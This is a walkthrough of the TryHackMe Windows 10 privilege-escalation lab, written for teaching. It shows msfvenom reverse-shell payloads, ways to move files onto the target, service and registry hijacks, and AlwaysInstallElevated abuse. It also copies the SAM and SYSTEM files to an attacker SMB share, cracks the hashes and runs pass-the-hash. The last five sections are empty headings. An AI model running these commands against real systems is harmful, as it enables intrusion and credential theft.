# Windows 10 Priv Esc room From TryHackMe

[1. Intro](#intro)

[2. Generating a Reverse Shell Executable](#generating-a-reverse-shell-executable)

[3. Service Exploits - Insecure Service Permissions](#service-exploits---insecure-service-permissions)

[4. Service Exploits - Unquoted Service Path](#service-exploits---unquoted-service-path)

[5. Service Exploits - Weak Registry Permissions](#service-exploits---weak-registry-permissions)

[6. Service Exploits - Insecure Service Executables](#service-exploits---insecure-service-executables)

[7. Registry - AutoRuns](#registry---autoruns)

[8. Registry - AlwaysInstallElevated](#registry---alwaysinstallelevated)

[9. Passwords - Registry](#passwords---registry)

[10. Passwords - saved creds](#passwords---saved-creds)

[11. Passwords - Security Account Manager (SAM)](#passwords---security-account-manager-sam)

[12. Passwords - Passing the Hash](#passwords---passing-the-hash)

[13. Scheduled Tasks](#scheduled-tasks)

[14. Insecure GUI Apps](#insecure-gui-apps)

[15. Startup Apps](#startup-apps)

[16. Token Impersonation - Rogue Potato](#token-impersonation---rogue-potato)

[17. Token Impersonation - PrintSpoofer](#token-impersonation---printspoofer)

[18. Privilege Escalation Scripts](#privilege-escalation-scripts)

## Intro

`xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP`

![image](https://user-images.githubusercontent.com/83407557/181599686-6ed867b0-25b4-47b1-8994-6fda5b5b3e36.png)
*image source https://tryhackme.com/room/windows10privesc*

## Generating a Reverse Shell Executable

The first step is going to be to create a reverse shell executable using msfvenom. Then I need to transfer this binary over to the target machine. The authors of this room have you transfer this file via SMB. However there are other ways of doing this, that I will also show here. They include, transfering the binary via FTP, netcat, exe2hex, and http. Depending on the firewalls certain ports may not be available, having multiple ways to transfer your files in your virtual tool belt is always a good thing.

### Creating reverse.exe

We need to know our ipv4 address on the tryhackme VPN before we can craft our revshell. Also in the example the author uses port 53 as the listening port. This is the port normally used by DNS, we may be using this for firewall reasons or because it is a good port to hide traffic, in any case I will be keeping it the same for my binary.

![image](https://user-images.githubusercontent.com/83407557/181602930-78389fa7-8de1-4d9c-bfb0-821e62fb4b48.png)*getting ipv4 address on THM vpn*

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.77.38 LPORT=53 -f exe -o reverse.exe`

![image](https://user-images.githubusercontent.com/83407557/181603375-da05a314-7e5a-43ed-ac1b-ae194ac8bd25.png)*Creating binary with msfvenom*

### Transfering reverse.exe Via SMB (The authors way)

Using the smb server from the impacket tool kit, from kali linux the following command can spin up an SMB share in the current directory with the following command:

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`

Then from the windows 10 RDP session, in a cmd terminal the copy command can be used to get a file from our SMB kali share:

`copy\\<kali ip>\kali\<file> <writable path on Windows>`  

![image](https://user-images.githubusercontent.com/83407557/181866236-da7538f9-95c2-42a2-a948-8f914f7ef448.png)

To test that it worked, start a netcat listener on port 53 and test the binary.

![image](https://user-images.githubusercontent.com/83407557/181866273-128d0611-d2b5-415c-9851-7a7548a9ef6c.png)

### Transfering reverse.exe Via HTTP

Using python3 on kali and powershell on the target machine, here is how we would download the binary via HTTP

![image](https://user-images.githubusercontent.com/83407557/181866418-6ef48e31-5c6c-49dd-ab8a-5a8512a4f5b4.png)

Again, we want to test that the transfer worked, but trying to get another nc callback.

![image](https://user-images.githubusercontent.com/83407557/181866474-d5093db4-908c-4fe9-b412-5199ca136c88.png)

### Transfering via FTP

Using a program like pure-ftp on kali, you can spin up a ftp server like we were able to do with ftp.

![image](https://user-images.githubusercontent.com/83407557/181866593-d7fa5bd6-f9d1-4881-89bc-1ad7ddba2948.png)

### Transfering via Exe2hex

Sometimes you only have access to a dumb-shell with no interactivity. Making certain methods (like ones where we are prompted for a password) impossible. There is however a program called exe2hex, that will turn a windows binary into a seqence of echo commands that can use a the windows clipboard to build out the binary on a target system:

First use exe2hex on our rev shell, then use xclip to copy the entire file to our clipboard.

![image](https://user-images.githubusercontent.com/83407557/182493651-c667adaa-8d6f-438a-b7f6-dce2126a44b5.png)

Then pasting it into a cmd prompt on windows, will create the binary in our current directory

![image](https://user-images.githubusercontent.com/83407557/182493955-7a3d8acb-8d04-44b9-9371-356b85abeb78.png)


### Transfering additional binaries

If we are already transfering binaries with no attempt to hide them or encrypt our traffic, we might as well transfer post exploitation tools as well. These (for me at least) will include a memory dumping tool such as mimikatz, an enumeration and priv-esc scanning tool such as WinPEAs, and pivoting tools such as chisel.

The first tool I will ususally run on a system will be WinPeas or LinPeas, especially if I am not nt system/root. Each of the methods of priv esc can be discovered using winpeas.
![image](https://user-images.githubusercontent.com/83407557/183122432-57de879e-8829-4e89-a293-0cc6a10aca63.png)

It can help spot things like system misconfigurations, kernel vulns, and stored passwords.

![image](https://user-images.githubusercontent.com/83407557/183122696-ff484129-1608-4597-98e3-46142938ca4e.png)


## Service Exploits - Insecure Service Permissions
As can be seen from winpeas, there is a service with insecure permissions in that we can modify it

![image](https://user-images.githubusercontent.com/83407557/183123129-7c92dec0-262c-4bfa-a581-648f6214916c.png)

I can use accesschk.exe from systinternals to show this as well as showing that SERVICE_CHANGE_CONFIG means I can modify this service. And sc query <servicename> shows that SERVICE_START_NAME = system.

![image](https://user-images.githubusercontent.com/83407557/183123579-71b7c08a-ac86-4d24-b9f9-69dcf681e20d.png)

![image](https://user-images.githubusercontent.com/83407557/183124232-33523d44-4405-4671-98f4-575f0cb28c9f.png)


To exploit this i can use sc configure to set the binary path to that of my own reverse shell
  
`sc config daclsvc binpath= "\"C:\Users\user\Desktop\reverse.exe""`

![image](https://user-images.githubusercontent.com/83407557/183125029-401a99f1-7f38-4a45-b638-747eecb2bfed.png)

After starting a netcat listener on kali, I can use **net start** to start the exploited daclsvc service. I will then get a system-shell callback on my nc listener.
  
  `net start daclsvc`
  
![image](https://user-images.githubusercontent.com/83407557/183125386-010dfafd-1cf5-4539-8f22-4699bd3d5e6d.png)

## Service Exploits - Unquoted Service Path

  From winpeas
  
  ![image](https://user-images.githubusercontent.com/83407557/183133260-43c41bbb-7682-4854-b9f5-fbe1add2c0f0.png)

  ![image](https://user-images.githubusercontent.com/83407557/183133306-5fc1559d-bc63-4b98-a672-41284a4902c3.png)

  
  using accesschk to see if the services run as system
  
  ![image](https://user-images.githubusercontent.com/83407557/183134005-cd8dfece-c39b-4f5d-8d19-7b02baee2cbf.png)

  
  Checking if I can write in the directories that are missing quotes but contain spaces:
  
  ![image](https://user-images.githubusercontent.com/83407557/183134375-fe092d96-aedc-4f1a-9cee-50a00be5133f.png)

  Since the built-in 'user' account can write in directory of the first service, I can simply copy my binary into that directory and rename it to common.exe
  
  `copy C:\users\user\desktop\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
  
  Then I can start a netcat listener on my kali machine, and restart the service on the windows target with **net start unquotedsvc**
  
  ![image](https://user-images.githubusercontent.com/83407557/183135362-cf510860-0258-4762-b9a2-52b9fc8cece0.png)

  ![image](https://user-images.githubusercontent.com/83407557/183135406-2790046e-9a2e-48dd-bada-c3ca7008ea3b.png)
 
## Service Exploits - Weak Registry Permissions

  ![image](https://user-images.githubusercontent.com/83407557/183137613-a7ca80bd-6b80-4e12-b2d8-26210bec4b71.png)
  
  Checking if it this service runs as system: `sc qc regsvc`
  
  ![image](https://user-images.githubusercontent.com/83407557/183137803-3594e611-1fe4-41e5-9b3c-4bae7dc42ca8.png)

  *Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):*
  
  ![image](https://user-images.githubusercontent.com/83407557/183137960-bbbd3fec-2022-4855-98f4-b5205455a8e9.png)

  
  Overwrite  ImagePath registry key to point to our binary
  
  `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\users\user\desktop\reverse.exe /f`
  
  Then start a netcat listener and restart(start) the service on Windows target CLI
  
  
  ![image](https://user-images.githubusercontent.com/83407557/183138531-566ea604-aca3-4fe1-8c4c-1b1aa46b38dd.png)

  
## Service Exploits - Insecure Service Executables

![image](https://user-images.githubusercontent.com/83407557/183143770-6e57f9c7-8a8a-4011-8672-b8fe4ba0869c.png)

checking that this service runs as system
  
  ![image](https://user-images.githubusercontent.com/83407557/183144678-51794ffa-1894-4383-a85e-aaa86c95d372.png)

  
`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"` To check if service is writeable
  
  ![image](https://user-images.githubusercontent.com/83407557/183144816-34e3da95-517a-4bc4-93ff-870f52b9ce53.png)

  Much like the previous example, but this time I am able to copy my malicious binary with the one that 1. runs as system 2. Is itself writeable
  
  `copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Starting a netcat listener first, I can then start the service with net start <servicename>:
  ![image](https://user-images.githubusercontent.com/83407557/183145241-62404c30-5691-465f-8c31-11bb288363ec.png)

  
  
## Registry - AutoRuns
  
  ![image](https://user-images.githubusercontent.com/83407557/183145650-9914cae5-179e-4d13-af33-43c434053eb5.png)


  checking via regisrty
  
  ![image](https://user-images.githubusercontent.com/83407557/183145440-76e716d2-ff52-4ad6-8a13-98cd233e8cfa.png)

Can also use accesschk to see if it is writeable
  
  `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
  
![image](https://user-images.githubusercontent.com/83407557/183145890-572c5043-09f7-4865-b2d5-f30bbc6644a7.png)

  
Then copy my binary to that location
  
  ![image](https://user-images.githubusercontent.com/83407557/183146204-ac637d53-3549-47a6-b10d-1dafded7f848.png)

 To simulate a new session (could also restart the machine and wait for an admin to log in) I will start a netcat listener, then log in as an admin on a second RDP connection:
  
  ![image](https://user-images.githubusercontent.com/83407557/183146793-a54231d4-0ad2-4159-b4c9-d84c01ade44c.png)

  
## Registry - AlwaysInstallElevated

If the alaysinstallelevated key is set in the registry to be enabled, it allows all users to install .msi files onto the system.
  
  ![image](https://user-images.githubusercontent.com/83407557/183153598-3b520b45-d45a-4148-a466-bd94658f5292.png)

Using the windows CLI to check:
  
  `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
  `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
![image](https://user-images.githubusercontent.com/83407557/183155968-bf9feb2e-b011-4b8c-a571-fedd6d0bc378.png)

  

To create my .msi file I can use msfvenom again, and then transfer it with one of the methods.
  
  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.77.38 LPORT=53 -f msi -o reverse.msi`

  
Then I can use msiexec to launch my malicious installer
  `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`
  
  ![image](https://user-images.githubusercontent.com/83407557/183156177-184ed963-f192-4dec-9411-0bd95d1f7485.png)

  
## Passwords - Registry
  
  ![image](https://user-images.githubusercontent.com/83407557/183157300-8aa068d6-7742-4775-9413-677d2073f755.png)

  Can then use multiple methods to login with found creds, Like with psexec.py:
  
  ![image](https://user-images.githubusercontent.com/83407557/183157787-c561d2b6-2392-4131-bcfe-c134f1454bdd.png)

  ![image](https://user-images.githubusercontent.com/83407557/183157801-c50ace54-25b1-4e61-9ba7-7796cd310533.png)

  or CME
  
  ![image](https://user-images.githubusercontent.com/83407557/183158093-9a3266df-2834-4a7b-84ae-b5b0ca561382.png)

  
## Passwords - saved creds
  
  List any saved credentials:`cmdkey /list`
  
  ![image](https://user-images.githubusercontent.com/83407557/183158418-375b0402-44d6-4c98-8b4a-9a0df15c733d.png)

  since they are saved, I can use runas to run my malicous binary as the Administrator after starting a netcat listener:
  
  ![image](https://user-images.githubusercontent.com/83407557/183159045-d951119b-bc56-465e-b71f-4dd54d027176.png)

  
## Passwords - Security Account Manager (SAM)
*The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.* 
  
  From WinPEAS
  ![image](https://user-images.githubusercontent.com/83407557/183223356-fb46c054-757a-45c8-8a6e-53a7b8dec47e.png)

  To copy these back-ups to kali for hash extraction using impacket and python:
  
  `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
  
  Then in windows target 
  
  `copy C:\Windows\Repair\SAM \\10.6.77.38\kali\`
  `copy C:\Windows\Repair\SYSTEM \\10.6.77.38\kali\`
  
  Then on kali, I will use creddump7 (git clone https://github.com/Tib3rius/creddump7)
  
  Then `python3 creddump7/pwdump.py SYSTEM SAM`
  
  ![image](https://user-images.githubusercontent.com/83407557/183224060-49dce860-c31a-42bf-90d2-738359fb21a9.png)

  
  To crack the hashes with hashcat, the output of the above can be piped to a file called hashes and then cracked with a wordlist:
  
![image](https://user-images.githubusercontent.com/83407557/183224202-b10a443d-fc51-48d9-8d7b-04623ab60486.png)

  ![image](https://user-images.githubusercontent.com/83407557/183224341-cbabb733-120d-40c2-b178-665fced6bc26.png)

  
  And I am able to crack the hashes with a publicly available wordlist(rockyou.txt)
  
  ![image](https://user-images.githubusercontent.com/83407557/183224282-c5aa77a7-c5d9-4623-a37e-f31499fe3498.png)

These can be used with the various methods such as RDP, SMB, PSexec, ect... or by PTH as will be shown next.
  
## Passwords - Passing the Hash
  Even without being able to crack a hash, with a pass the hash attack I can login as the admin user with just thier username and hash(LM and NTLM) separated by a %:
  
  `pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.80.183 cmd.exe`
  
  ![image](https://user-images.githubusercontent.com/83407557/183224619-9e5a1d0c-006c-4cce-b3c3-266343f4af9a.png)

  
## Scheduled Tasks
  
  
## Insecure GUI Apps
## Startup Apps
## Token Impersonation - Rogue Potato
## Token Impersonation - PrintSpoofer
## Privilege Escalation Scripts
